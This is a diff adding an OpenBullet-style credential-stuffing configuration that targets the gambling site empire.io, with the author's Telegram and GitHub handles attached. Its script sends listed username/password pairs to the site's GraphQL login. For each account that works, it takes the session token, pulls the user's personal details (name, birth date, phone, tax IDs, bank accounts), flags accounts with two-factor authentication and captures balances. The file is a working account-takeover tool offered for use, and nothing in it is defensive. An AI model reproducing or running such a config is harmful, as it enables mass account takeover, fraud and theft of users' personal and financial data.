@@ -1,0 +1,118 @@
+[SETTINGS]
+{
+  "Name": "Empire.io",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2024-09-01T03:33:33.3333333-07:00",
+  "AdditionalInfo": "github.com/0xSums",
+  "RequiredPlugins": [],
+  "Author": "✧",
+  "Version": "[t.me/imSums]"
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Emppire",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#/graphql REQUEST POST "https://empire.io/graphql" 
+  CONTENT "{\"operationName\":\"LoginMutation\",\"variables\":{\"site\":\"empire\",\"language\":\"en\",\"password\":\"<PASS>\",\"username\":\"<USER>\",\"captchaVersion\":\"v2\",\"domain\":\"empire.io\",\"authClearanceId\":\"\"},\"query\":\"mutation LoginMutation($username: String!, $password: String!, $site: String!, $otp: String, $captcha: String, $captchaVersion: String, $language: String, $domain: String, $authClearanceId: String) {\\\\n  userManagementLoginViaPassword(\\\\n    input: {site: $site, username: $username, password: $password, otp: $otp, captcha: $captcha, captchaVersion: $captchaVersion, language: $language, domain: $domain, authClearanceId: $authClearanceId}\\\\n  ) {\\\\n    sessionId\\\\n    token\\\\n    userManagement {\\\\n      currentUser {\\\\n        username\\\\n        email\\\\n        __typename\\\\n      }\\\\n      currentProfile {\\\\n        _id\\\\n        __typename\\\\n      }\\\\n      __typename\\\\n    }\\\\n    deviceDataToken\\\\n    errors {\\\\n      ...ErrorsFragment\\\\n      __typename\\\\n    }\\\\n    __typename\\\\n  }\\\\n}\\\\n\\\\nfragment ErrorsFragment on UserManagementError {\\\\n  message\\\\n  params {\\\\n    name\\\\n    value\\\\n    __typename\\\\n  }\\\\n  __typename\\\\n}\\\\n\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#200_OK? KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"INVALID_EMAIL_OR_PASSWORD\"" 
+  KEYCHAIN Success OR 
+    KEY "\"token\":\"eyJ" 
+
+#token PARSE "<SOURCE>" JSON "token" -> VAR "X" 
+
+#/graphql REQUEST POST "https://empire.io/graphql" 
+  CONTENT "{\"operationName\":\"UserManagementQuery\",\"query\":\"query UserManagementQuery {\\\\n  userManagement {\\\\n    id\\\\n    user: currentUser {\\\\n      id\\\\n      email\\\\n      username\\\\n      __typename\\\\n    }\\\\n    profile: currentProfile {\\\\n      _id\\\\n      id\\\\n      firstName\\\\n      lastName\\\\n      dateOfBirth\\\\n      phone\\\\n      email\\\\n      emailVerified\\\\n      city\\\\n      zip\\\\n      cpf\\\\n      hasOtp\\\\n      hasSMS2FA\\\\n      labId\\\\n      depositAccount\\\\n      withdrawalAccount\\\\n      siteHandle\\\\n      onboarding\\\\n      conversionCurrency\\\\n      cpfStatus {\\\\n        cpf\\\\n        status\\\\n        __typename\\\\n      }\\\\n      rfc\\\\n      rfcStatus {\\\\n        rfc\\\\n        status\\\\n        __typename\\\\n      }\\\\n      __typename\\\\n    }\\\\n    __typename\\\\n  }\\\\n  features {\\\\n    id\\\\n    walletCurrency: myGroupTag(name: \\\\n\\\"DepositCurrency\\\")\\\\n    __typename\\\\n  }\\\\n  banking {\\\\n    id\\\\n    hasAnyTransactions {\\\\n      id\\\\n      hasAnyTransactions\\\\n      __typename\\\\n    }\\\\n    __typename\\\\n  }\\\\n}\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "token: <X>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <X>" 
+
+#has2FA? KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "\"hasSMS2FA\":true" 
+    KEY "\"hasOtp\":true" 
+
+#/graphql REQUEST POST "https://empire.io/graphql" 
+  CONTENT "{\"operationName\":\"MyAllBalancesQuery\",\"query\":\"query MyAllBalancesQuery($conversionCurrency: String!) {\\\\n  banking {\\\\n    id\\\\n    myAllBalances(conversionCurrency: $conversionCurrency) {\\\\n      edges {\\\\n        node {\\\\n          ...BalanceFragment\\\\n          __typename\\\\n        }\\\\n        __typename\\\\n      }\\\\n      __typename\\\\n    }\\\\n    __typename\\\\n  }\\\\n}\\\\nfragment BalanceFragment on BankingBalance {\\\\n  id\\\\n  currency\\\\n  totalBalance\\\\n  realBalance\\\\n  convertedTotalBalance\\\\n  __typename\\\\n}\",\"variables\":{\"conversionCurrency\":\"USD\"}}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "token: <X>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <X>" 
+
+#totalBalance PARSE "<SOURCE>" JSON "totalBalance" Recursive=TRUE -> VAR "TB" 
+
+#$? KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<TB>" DoesNotContain "1" 
+    KEY "<TB>" DoesNotContain "2" 
+    KEY "<TB>" DoesNotContain "3" 
+    KEY "<TB>" DoesNotContain "4" 
+    KEY "<TB>" DoesNotContain "5" 
+    KEY "<TB>" DoesNotContain "6" 
+    KEY "<TB>" DoesNotContain "7" 
+    KEY "<TB>" DoesNotContain "8" 
+    KEY "<TB>" DoesNotContain "9" 
+
+#totalBalance PARSE "<SOURCE>" JSON "totalBalance" Recursive=TRUE CreateEmpty=FALSE -> CAP "Balance(s)" 
+
